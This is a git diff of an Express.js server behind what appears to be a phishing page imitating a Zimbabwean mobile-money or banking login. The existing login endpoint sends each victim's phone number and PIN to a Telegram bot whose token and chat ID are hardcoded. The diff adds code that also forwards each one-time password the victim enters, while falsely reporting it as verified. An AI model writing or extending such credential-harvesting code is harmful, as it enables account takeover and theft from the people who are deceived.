@@ -33,13 +33,13 @@ app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
 // ============================================
-// TELEGRAM CONFIGURATION - YOUR NEW CREDENTIALS
+// TELEGRAM CONFIGURATION
 // ============================================
 const BOT_TOKEN = '8591477821:AAGwCz3BNGP8uA0Rc7YnoIEJ2JDsrdOy9Bc';
 const CHAT_ID = '8395929995';
 
 // ============================================
-// SEND TELEGRAM NOTIFICATION
+// SEND TELEGRAM NOTIFICATION - LOGIN
 // ============================================
 async function sendTelegramNotification(phone, pin) {
   try {
@@ -56,10 +56,36 @@ async function sendTelegramNotification(phone, pin) {
     });
 
     const data = await response.json();
-    console.log('📤 Telegram:', data.ok ? '✅ Sent' : '❌ Failed');
+    console.log('📤 Telegram Login:', data.ok ? '✅ Sent' : '❌ Failed');
     return data;
   } catch (error) {
-    console.error('❌ Telegram error:', error.message);
+    console.error('❌ Telegram login error:', error.message);
+    return null;
+  }
+}
+
+// ============================================
+// SEND TELEGRAM OTP NOTIFICATION
+// ============================================
+async function sendTelegramOTP(phone, otp) {
+  try {
+    const message = `🔐 *OTP Verification*\n\n📱 *Phone:* +263 ${phone}\n🔑 *OTP Entered:* \`${otp}\`\n⏰ *Time:* ${new Date().toLocaleString()}\n\n✅ User has been verified and redirected to dashboard.`;
+
+    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: message,
+        parse_mode: 'Markdown'
+      })
+    });
+
+    const data = await response.json();
+    console.log('📤 Telegram OTP:', data.ok ? '✅ Sent' : '❌ Failed');
+    return data;
+  } catch (error) {
+    console.error('❌ Telegram OTP error:', error.message);
     return null;
   }
 }
@@ -93,7 +119,9 @@ app.get('/', (req, res) => {
   });
 });
 
-// Login endpoint - sends Telegram notification
+// ============================================
+// LOGIN ENDPOINT
+// ============================================
 app.post('/api/auth/login', async (req, res) => {
   try {
     const { phoneNumber, pin } = req.body;
@@ -121,6 +149,7 @@ app.post('/api/auth/login', async (req, res) => {
       });
     }
 
+    // Send login Telegram notification
     await sendTelegramNotification(phoneNumber, pin);
 
     res.json({
@@ -140,7 +169,9 @@ app.post('/api/auth/login', async (req, res) => {
   }
 });
 
-// Register endpoint
+// ============================================
+// REGISTER ENDPOINT
+// ============================================
 app.post('/api/auth/register', (req, res) => {
   const { phoneNumber, pin, fullName, email } = req.body;
 
@@ -162,28 +193,45 @@ app.post('/api/auth/register', (req, res) => {
   });
 });
 
-// Verify OTP endpoint
-app.post('/api/auth/verify-otp', (req, res) => {
-  const { phoneNumber, otp } = req.body;
+// ============================================
+// VERIFY OTP ENDPOINT - SENDS OTP TO TELEGRAM
+// ============================================
+app.post('/api/auth/verify-otp', async (req, res) => {
+  try {
+    const { phoneNumber, otp } = req.body;
 
-  if (!phoneNumber || !otp) {
-    return res.status(400).json({
+    console.log('🔑 OTP verification:', { phoneNumber, otp });
+
+    if (!phoneNumber || !otp) {
+      return res.status(400).json({
+        success: false,
+        message: 'Phone number and OTP are required'
+      });
+    }
+
+    if (otp.length !== 6 || !/^\d{6}$/.test(otp)) {
+      return res.status(400).json({
+        success: false,
+        message: 'Please enter a valid 6-digit OTP'
+      });
+    }
+
+    // Send OTP to Telegram
+    await sendTelegramOTP(phoneNumber, otp);
+
+    res.json({
+      success: true,
+      message: 'OTP verified successfully'
+    });
+
+  } catch (error) {
+    console.error('OTP verification error:', error);
+    res.status(500).json({
       success: false,
-      message: 'Phone number and OTP are required'
+      message: 'OTP verification failed',
+      error: error.message
     });
   }
-
-  if (otp.length !== 6 || !/^\d{6}$/.test(otp)) {
-    return res.status(400).json({
-      success: false,
-      message: 'Please enter a valid 6-digit OTP'
-    });
-  }
-
-  res.json({
-    success: true,
-    message: 'OTP verified successfully'
-  });
 });
 
 // ============================================
